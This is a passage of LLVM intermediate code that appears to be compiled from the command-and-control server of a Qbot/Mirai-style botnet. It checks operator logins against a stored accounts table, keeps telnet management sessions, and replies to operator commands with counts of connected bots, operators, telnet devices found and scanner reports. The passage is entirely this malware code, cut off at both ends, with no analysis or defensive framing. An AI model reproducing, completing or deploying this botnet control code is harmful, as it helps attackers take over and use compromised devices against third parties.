  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %147
  %149 = getelementptr inbounds %struct.login_info, %struct.login_info* %148, i32 0, i32 1
  %150 = getelementptr inbounds [20 x i8], [20 x i8]* %149, i64 0, i64 0
  %151 = call i32 @strcmp(i8* %145, i8* %150) #8
  %152 = icmp ne i32 %151, 0
  br i1 %152, label %153, label %154

153:                                              ; preds = %143
  br label %157

154:                                              ; preds = %143
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %155, i8 0, i64 2048, i1 false)
  br label %174

156:                                              ; preds = %112
  br label %157

157:                                              ; preds = %156, %153
  %158 = load i32, i32* %4, align 4
  %159 = call i64 @send(i32 %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 16384)
  %160 = icmp eq i64 %159, -1
  br i1 %160, label %161, label %162

161:                                              ; preds = %157
  br label %855

162:                                              ; preds = %157
  %163 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %164 = call i32 (i8*, i8*, ...) @sprintf(i8* %163, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i64 0, i64 0)) #9
  %165 = load i32, i32* %4, align 4
  %166 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %167 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %168 = call i64 @strlen(i8* %167) #8
  %169 = call i64 @send(i32 %165, i8* %166, i64 %168, i32 16384)
  %170 = icmp eq i64 %169, -1
  br i1 %170, label %171, label %172

171:                                              ; preds = %162
  br label %855

172:                                              ; preds = %162
  %173 = call i32 @sleep(i32 5)
  br label %855

174:                                              ; preds = %154
  %175 = load i8*, i8** %3, align 8
  %176 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %175) #9
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %177, i8 0, i64 2048, i1 false)
  %178 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %179 = call i32 (i8*, i8*, ...) @sprintf(i8* %178, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i64 0, i64 0)) #9
  %180 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %181 = call i32 (i8*, i8*, ...) @sprintf(i8* %180, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i64 0, i64 0)) #9
  %182 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* %182, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i64 0, i64 0)) #9
  %184 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %185 = call i32 (i8*, i8*, ...) @sprintf(i8* %184, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i64 0, i64 0)) #9
  %186 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %186, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i64 0, i64 0)) #9
  %188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %189 = call i32 (i8*, i8*, ...) @sprintf(i8* %188, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i64 0, i64 0)) #9
  %190 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %191 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i64 0, i64 0)) #9
  %192 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %192, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i64 0, i64 0)) #9
  %194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %195 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i64 0, i64 0)) #9
  %196 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %198
  %200 = getelementptr inbounds %struct.login_info, %struct.login_info* %199, i32 0, i32 0
  %201 = getelementptr inbounds [20 x i8], [20 x i8]* %200, i64 0, i64 0
  %202 = call i32 (i8*, i8*, ...) @sprintf(i8* %196, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i64 0, i64 0), i8* %201) #9
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %204 = call i32 (i8*, i8*, ...) @sprintf(i8* %203, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.36, i64 0, i64 0)) #9
  %205 = load i32, i32* %4, align 4
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %207 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %208 = call i64 @strlen(i8* %207) #8
  %209 = call i64 @send(i32 %205, i8* %206, i64 %208, i32 16384)
  %210 = icmp eq i64 %209, -1
  br i1 %210, label %211, label %212

211:                                              ; preds = %174
  br label %855

212:                                              ; preds = %174
  %213 = load i32, i32* %4, align 4
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %215 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %216 = call i64 @strlen(i8* %215) #8
  %217 = call i64 @send(i32 %213, i8* %214, i64 %216, i32 16384)
  %218 = icmp eq i64 %217, -1
  br i1 %218, label %219, label %220

219:                                              ; preds = %212
  br label %855

220:                                              ; preds = %212
  %221 = load i32, i32* %4, align 4
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %223 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %224 = call i64 @strlen(i8* %223) #8
  %225 = call i64 @send(i32 %221, i8* %222, i64 %224, i32 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %228

227:                                              ; preds = %220
  br label %855

228:                                              ; preds = %220
  %229 = load i32, i32* %4, align 4
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %231 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %232 = call i64 @strlen(i8* %231) #8
  %233 = call i64 @send(i32 %229, i8* %230, i64 %232, i32 16384)
  %234 = icmp eq i64 %233, -1
  br i1 %234, label %235, label %236

235:                                              ; preds = %228
  br label %855

236:                                              ; preds = %228
  %237 = load i32, i32* %4, align 4
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %239 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %240 = call i64 @strlen(i8* %239) #8
  %241 = call i64 @send(i32 %237, i8* %238, i64 %240, i32 16384)
  %242 = icmp eq i64 %241, -1
  br i1 %242, label %243, label %244

243:                                              ; preds = %236
  br label %855

244:                                              ; preds = %236
  %245 = load i32, i32* %4, align 4
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %247 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %248 = call i64 @strlen(i8* %247) #8
  %249 = call i64 @send(i32 %245, i8* %246, i64 %248, i32 16384)
  %250 = icmp eq i64 %249, -1
  br i1 %250, label %251, label %252

251:                                              ; preds = %244
  br label %855

252:                                              ; preds = %244
  %253 = load i32, i32* %4, align 4
  %254 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %255 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %256 = call i64 @strlen(i8* %255) #8
  %257 = call i64 @send(i32 %253, i8* %254, i64 %256, i32 16384)
  %258 = icmp eq i64 %257, -1
  br i1 %258, label %259, label %260

259:                                              ; preds = %252
  br label %855

260:                                              ; preds = %252
  %261 = load i32, i32* %4, align 4
  %262 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %263 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %264 = call i64 @strlen(i8* %263) #8
  %265 = call i64 @send(i32 %261, i8* %262, i64 %264, i32 16384)
  %266 = icmp eq i64 %265, -1
  br i1 %266, label %267, label %268

267:                                              ; preds = %260
  br label %855

268:                                              ; preds = %260
  %269 = load i32, i32* %4, align 4
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %271 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %272 = call i64 @strlen(i8* %271) #8
  %273 = call i64 @send(i32 %269, i8* %270, i64 %272, i32 16384)
  %274 = icmp eq i64 %273, -1
  br i1 %274, label %275, label %276

275:                                              ; preds = %268
  br label %855

276:                                              ; preds = %268
  %277 = load i32, i32* %4, align 4
  %278 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %279 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %280 = call i64 @strlen(i8* %279) #8
  %281 = call i64 @send(i32 %277, i8* %278, i64 %280, i32 16384)
  %282 = icmp eq i64 %281, -1
  br i1 %282, label %283, label %284

283:                                              ; preds = %276
  br label %855

284:                                              ; preds = %276
  br label %285

285:                                              ; preds = %284
  %286 = load i32, i32* %4, align 4
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %288 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %289 = call i64 @strlen(i8* %288) #8
  %290 = call i64 @send(i32 %286, i8* %287, i64 %289, i32 16384)
  %291 = icmp eq i64 %290, -1
  br i1 %291, label %292, label %293

292:                                              ; preds = %285
  br label %855

293:                                              ; preds = %285
  %294 = load i32, i32* %4, align 4
  %295 = call i64 @send(i32 %294, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %296 = icmp eq i64 %295, -1
  br i1 %296, label %297, label %298

297:                                              ; preds = %293
  br label %855

298:                                              ; preds = %293
  br label %299

299:                                              ; preds = %298
  %300 = load i8*, i8** %3, align 8
  %301 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %300) #9
  %302 = load i32, i32* %4, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %303
  %305 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %304, i32 0, i32 0
  store i32 1, i32* %305, align 4
  br label %306

306:                                              ; preds = %821, %820, %787, %763, %739, %628, %607, %543, %356, %333, %299
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %308 = load i32, i32* %4, align 4
  %309 = call i32 @fdgets(i8* %307, i32 2048, i32 %308)
  %310 = icmp sgt i32 %309, 0
  br i1 %310, label %311, label %854

311:                                              ; preds = %306
  %312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %313 = call i8* @strstr(i8* %312, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #8
  %314 = icmp ne i8* %313, null
  br i1 %314, label %315, label %334

315:                                              ; preds = %311
  %316 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %316, i8 0, i64 2048, i1 false)
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i64 0, i64 0
  %318 = call i32 @BotsConnected()
  %319 = load volatile i32, i32* @OperatorsConnected, align 4
  %320 = call i32 (i8*, i8*, ...) @sprintf(i8* %317, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.39, i64 0, i64 0), i32 %318, i32 %319) #9
  %321 = load i32, i32* %4, align 4
  %322 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i64 0, i64 0
  %323 = getelementptr inbounds [2048 x i8], [2048 x i8]* %28, i64 0, i64 0
  %324 = call i64 @strlen(i8* %323) #8
  %325 = call i64 @send(i32 %321, i8* %322, i64 %324, i32 16384)
  %326 = icmp eq i64 %325, -1
  br i1 %326, label %327, label %328

327:                                              ; preds = %315
  store i8* null, i8** %2, align 8
  br label %864

328:                                              ; preds = %315
  %329 = load i32, i32* %4, align 4
  %330 = call i64 @send(i32 %329, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %331 = icmp eq i64 %330, -1
  br i1 %331, label %332, label %333

332:                                              ; preds = %328
  br label %855

333:                                              ; preds = %328
  br label %306, !llvm.loop !19

334:                                              ; preds = %311
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0)) #8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %357

338:                                              ; preds = %334
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %339, i8 0, i64 2048, i1 false)
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i64 0, i64 0
  %341 = load volatile i32, i32* @TELFound, align 4
  %342 = load volatile i32, i32* @scannerreport, align 4
  %343 = call i32 (i8*, i8*, ...) @sprintf(i8* %340, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i64 0, i64 0), i32 %341, i32 %342) #9
  %344 = load i32, i32* %4, align 4
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i64 0, i64 0
  %346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %29, i64 0, i64 0
  %347 = call i64 @strlen(i8* %346) #8
  %348 = call i64 @send(i32 %344, i8* %345, i64 %347, i32 16384)
  %349 = icmp eq i64 %348, -1
  br i1 %349, label %350, label %351

350:                                              ; preds = %338
  store i8* null, i8** %2, align 8
  br label %864

351:                                              ; preds = %338
  %352 = load i32, i32* %4, align 4
  %353 = call i64 @send(i32 %352, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %354 = icmp eq i64 %353, -1
  br i1 %354, label %355, label %356

355:                                              ; preds = %351
  br label %855

356:                                              ; preds = %351
  br label %306, !llvm.loop !19

357:                                              ; preds = %334
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %359 = call i8* @strstr(i8* %358, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0)) #8
  %360 = icmp ne i8* %359, null
  br i1 %360, label %361, label %544

361:                                              ; preds = %357
  %362 = load i8*, i8** %3, align 8
  %363 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %362) #9
  %364 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %365 = load i32, i32* %5, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %366
  %368 = getelementptr inbounds %struct.login_info, %struct.login_info* %367, i32 0, i32 0
  %369 = getelementptr inbounds [20 x i8], [20 x i8]* %368, i64 0, i64 0
  %370 = call i32 (i8*, i8*, ...) @sprintf(i8* %364, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i64 0, i64 0), i8* %369) #9
  %371 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %372 = call i32 (i8*, i8*, ...) @sprintf(i8* %371, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i64 0, i64 0)) #9
  %373 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %374 = call i32 (i8*, i8*, ...) @sprintf(i8* %373, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i64 0, i64 0)) #9
  %375 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %376 = call i32 (i8*, i8*, ...) @sprintf(i8* %375, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i64 0, i64 0)) #9
  %377 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %378 = call i32 (i8*, i8*, ...) @sprintf(i8* %377, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i64 0, i64 0)) #9
  %379 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %380 = call i32 (i8*, i8*, ...) @sprintf(i8* %379, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0)) #9
  %381 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %382 = call i32 (i8*, i8*, ...) @sprintf(i8* %381, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i64 0, i64 0)) #9
  %383 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %384 = call i32 (i8*, i8*, ...) @sprintf(i8* %383, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0)) #9
  %385 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %386 = call i32 (i8*, i8*, ...) @sprintf(i8* %385, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i64 0, i64 0)) #9
  %387 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %388 = call i32 (i8*, i8*, ...) @sprintf(i8* %387, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i64 0, i64 0)) #9
  %389 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %390 = call i32 (i8*, i8*, ...) @sprintf(i8* %389, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i64 0, i64 0)) #9
  %391 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %392 = call i32 (i8*, i8*, ...) @sprintf(i8* %391, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i64 0, i64 0)) #9
  %393 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %394 = call i32 (i8*, i8*, ...) @sprintf(i8* %393, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i64 0, i64 0)) #9
  %395 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %396 = call i32 (i8*, i8*, ...) @sprintf(i8* %395, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i64 0, i64 0)) #9
  %397 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %398 = call i32 (i8*, i8*, ...) @sprintf(i8* %397, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i64 0, i64 0)) #9
  %399 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %400 = call i32 (i8*, i8*, ...) @sprintf(i8* %399, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0)) #9
  %401 = load i32, i32* %4, align 4
  %402 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %403 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %404 = call i64 @strlen(i8* %403) #8
  %405 = call i64 @send(i32 %401, i8* %402, i64 %404, i32 16384)
  %406 = icmp eq i64 %405, -1
  br i1 %406, label %407, label %408

407:                                              ; preds = %361
  br label %855

408:                                              ; preds = %361
  %409 = load i32, i32* %4, align 4
  %410 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %411 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %412 = call i64 @strlen(i8* %411) #8
  %413 = call i64 @send(i32 %409, i8* %410, i64 %412, i32 16384)
  %414 = icmp eq i64 %413, -1
  br i1 %414, label %415, label %416

415:                                              ; preds = %408
  br label %855

416:                                              ; preds = %408
  %417 = load i32, i32* %4, align 4
  %418 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %419 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %420 = call i64 @strlen(i8* %419) #8
  %421 = call i64 @send(i32 %417, i8* %418, i64 %420, i32 16384)
  %422 = icmp eq i64 %421, -1
  br i1 %422, label %423, label %424

423:                                              ; preds = %416
  br label %855

424:                                              ; preds = %416
  %425 = load i32, i32* %4, align 4
  %426 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %427 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %428 = call i64 @strlen(i8* %427) #8
  %429 = call i64 @send(i32 %425, i8* %426, i64 %428, i32 16384)
  %430 = icmp eq i64 %429, -1
  br i1 %430, label %431, label %432

431:                                              ; preds = %424
  br label %855

432:                                              ; preds = %424
  %433 = load i32, i32* %4, align 4
  %434 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %435 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %436 = call i64 @strlen(i8* %435) #8
  %437 = call i64 @send(i32 %433, i8* %434, i64 %436, i32 16384)
  %438 = icmp eq i64 %437, -1
  br i1 %438, label %439, label %440

439:                                              ; preds = %432
  br label %855

440:                                              ; preds = %432
  %441 = load i32, i32* %4, align 4
  %442 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %443 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %444 = call i64 @strlen(i8* %443) #8
  %445 = call i64 @send(i32 %441, i8* %442, i64 %444, i32 16384)
  %446 = icmp eq i64 %445, -1
  br i1 %446, label %447, label %448

447:                                              ; preds = %440
  br label %855

448:                                              ; preds = %440
  %449 = load i32, i32* %4, align 4
  %450 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %451 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %452 = call i64 @strlen(i8* %451) #8
  %453 = call i64 @send(i32 %449, i8* %450, i64 %452, i32 16384)
  %454 = icmp eq i64 %453, -1
  br i1 %454, label %455, label %456

455:                                              ; preds = %448
  br label %855

456:                                              ; preds = %448
  %457 = load i32, i32* %4, align 4
  %458 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %459 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %460 = call i64 @strlen(i8* %459) #8
  %461 = call i64 @send(i32 %457, i8* %458, i64 %460, i32 16384)
  %462 = icmp eq i64 %461, -1
  br i1 %462, label %463, label %464

463:                                              ; preds = %456
  br label %855

464:                                              ; preds = %456
  %465 = load i32, i32* %4, align 4
  %466 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %467 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %468 = call i64 @strlen(i8* %467) #8
  %469 = call i64 @send(i32 %465, i8* %466, i64 %468, i32 16384)
  %470 = icmp eq i64 %469, -1
  br i1 %470, label %471, label %472

471:                                              ; preds = %464
  br label %855

472:                                              ; preds = %464
  %473 = load i32, i32* %4, align 4
  %474 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %475 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %476 = call i64 @strlen(i8* %475) #8
  %477 = call i64 @send(i32 %473, i8* %474, i64 %476, i32 16384)
  %478 = icmp eq i64 %477, -1
  br i1 %478, label %479, label %480

479:                                              ; preds = %472
  br label %855

480:                                              ; preds = %472
  %481 = load i32, i32* %4, align 4
  %482 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %483 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %484 = call i64 @strlen(i8* %483) #8
  %485 = call i64 @send(i32 %481, i8* %482, i64 %484, i32 16384)
  %486 = icmp eq i64 %485, -1
  br i1 %486, label %487, label %488

487:                                              ; preds = %480
  br label %855

488:                                              ; preds = %480
  %489 = load i32, i32* %4, align 4
  %490 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %491 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %492 = call i64 @strlen(i8* %491) #8
  %493 = call i64 @send(i32 %489, i8* %490, i64 %492, i32 16384)
  %494 = icmp eq i64 %493, -1
  br i1 %494, label %495, label %496

495:                                              ; preds = %488
  br label %855

496:                                              ; preds = %488
  %497 = load i32, i32* %4, align 4
  %498 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %499 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %500 = call i64 @strlen(i8* %499) #8
  %501 = call i64 @send(i32 %497, i8* %498, i64 %500, i32 16384)
  %502 = icmp eq i64 %501, -1
  br i1 %502, label %503, label %504

503:                                              ; preds = %496
  br label %855

504:                                              ; preds = %496
  %505 = load i32, i32* %4, align 4
  %506 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %507 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %508 = call i64 @strlen(i8* %507) #8
  %509 = call i64 @send(i32 %505, i8* %506, i64 %508, i32 16384)
  %510 = icmp eq i64 %509, -1
  br i1 %510, label %511, label %512

511:                                              ; preds = %504
  br label %855

512:                                              ; preds = %504
  %513 = load i32, i32* %4, align 4
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %515 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %516 = call i64 @strlen(i8* %515) #8
  %517 = call i64 @send(i32 %513, i8* %514, i64 %516, i32 16384)
  %518 = icmp eq i64 %517, -1
  br i1 %518, label %519, label %520

519:                                              ; preds = %512
  br label %855

520:                                              ; preds = %512
  %521 = load i32, i32* %4, align 4
  %522 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %523 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %524 = call i64 @strlen(i8* %523) #8
  %525 = call i64 @send(i32 %521, i8* %522, i64 %524, i32 16384)
  %526 = icmp eq i64 %525, -1
  br i1 %526, label %527, label %528

527:                                              ; preds = %520
  br label %855

528:                                              ; preds = %520
  %529 = load i32, i32* %4, align 4
  %530 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %531 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %532 = call i64 @strlen(i8* %531) #8
  %533 = call i64 @send(i32 %529, i8* %530, i64 %532, i32 16384)
  %534 = icmp eq i64 %533, -1
  br i1 %534, label %535, label %536

535:                                              ; preds = %528
  br label %855

536:                                              ; preds = %528
  %537 = load i8*, i8** %3, align 8
  %538 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %537) #9
  %539 = load i32, i32* %4, align 4
  %540 = call i64 @send(i32 %539, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %541 = icmp eq i64 %540, -1
  br i1 %541, label %542, label %543

542:                                              ; preds = %536
  br label %855

543:                                              ; preds = %536
  br label %306, !llvm.loop !19

544:                                              ; preds = %357
  %545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %546 = call i8* @strstr(i8* %545, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i64 0, i64 0)) #8
  %547 = icmp ne i8* %546, null
  br i1 %547, label %548, label %608

548:                                              ; preds = %544
  %549 = load i8*, i8** %3, align 8
  %550 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %549) #9
  %551 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %552 = call i32 (i8*, i8*, ...) @sprintf(i8* %551, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.58, i64 0, i64 0)) #9
  %553 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %554 = call i32 (i8*, i8*, ...) @sprintf(i8* %553, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.59, i64 0, i64 0)) #9
  %555 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %556 = call i32 (i8*, i8*, ...) @sprintf(i8* %555, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.60, i64 0, i64 0)) #9
  %557 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %558 = call i32 (i8*, i8*, ...) @sprintf(i8* %557, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.61, i64 0, i64 0)) #9
  %559 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
